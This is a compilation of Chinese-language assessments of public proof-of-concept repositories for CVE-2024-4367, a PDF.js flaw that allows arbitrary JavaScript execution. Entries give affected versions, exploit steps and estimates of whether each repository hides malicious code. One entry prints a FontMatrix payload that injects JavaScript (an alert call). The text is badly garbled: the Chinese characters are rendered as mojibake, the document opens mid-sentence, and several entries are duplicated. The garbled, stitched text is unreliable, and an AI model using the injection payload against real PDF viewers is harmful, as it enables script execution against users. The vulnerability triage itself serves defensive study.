è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

